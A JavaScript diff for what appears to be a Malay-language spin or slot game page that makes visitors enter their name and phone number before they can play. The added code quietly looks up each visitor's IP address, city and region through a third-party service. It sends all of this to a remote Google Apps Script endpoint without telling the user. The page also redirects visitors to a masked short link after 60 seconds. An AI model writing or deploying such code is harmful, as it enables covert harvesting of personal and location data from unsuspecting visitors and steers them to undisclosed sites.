@@ -12,37 +12,53 @@ const creditDisplay = document.getElementById("credit");
 const spinDisplay = document.getElementById("spinCount");
 const spinSound = new Audio("https://files.catbox.moe/f4h4ut.mp3");
 
-// Form submit
-form.addEventListener("submit", function (e) {
+// ======= FORM SUBMIT WITH AUTO IP =======
+form.addEventListener("submit", async function (e) {
   e.preventDefault();
   const nama = document.getElementById("nama").value;
   const phone = document.getElementById("phone").value;
 
-  fetch("https://script.google.com/macros/s/AKfycbxIP3aqdjZa-muLKd_byvRoixrWudbLEvCjXHM5OOyy1EJuxMsVdXdejRi7cHpbCoHf/exec", {
-    method: "POST",
-    body: JSON.stringify({ nama: nama, phone: phone }),
-    headers: {
-      "Content-Type": "application/json"
-    }
-  })
-  .then(res => res.text())
-  .then(data => {
-    // Bila berjaya hantar ke Sheets → terus tampilkan game
-    formWrapper.style.display = "none";
-    gameContainer.style.display = "block";
-  })
-  .catch(err => {
-    alert("❌ Gagal hantar data. Sila cuba lagi.");
-    console.error("Submit error: ", err);
-  });
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const ipData = await res.json();
+
+    const dataToSend = {
+      nama: nama,
+      phone: phone,
+      ip: ipData.ip || "-",
+      city: ipData.city || "-",
+      region: ipData.region || "-"
+    };
+
+    fetch("https://script.google.com/macros/s/AKfycbz4NI-Mu6QT-xgx8fDrpr3xDsSGORzlNSQiTKGbIHjE9KjXiclztke5Pom6RrLQZFQ/exec", {
+      method: "POST",
+      body: JSON.stringify(dataToSend),
+      headers: {
+        "Content-Type": "application/json"
+      }
+    })
+    .then(res => res.text())
+    .then(() => {
+      formWrapper.style.display = "none";
+      gameContainer.style.display = "block";
+    })
+    .catch(err => {
+      alert("❌ Gagal hantar data. Sila cuba lagi.");
+      console.error("Submit error: ", err);
+    });
+
+  } catch (err) {
+    console.error("IP fetch failed:", err);
+    alert("Gagal kesan lokasi. Sila cuba lagi.");
+  }
 });
 
-// Auto redirect after 60 seconds
+// ======= AUTO REDIRECT AFTER 60s =======
 setTimeout(() => {
   window.location.href = "https://rebrand.ly/Pn83u0e";
 }, 60000);
 
-// SPIN function
+// ======= SPIN FUNCTION =======
 function spin() {
   if (credit < bet) {
     alert("❌ Kredit tidak cukup!");
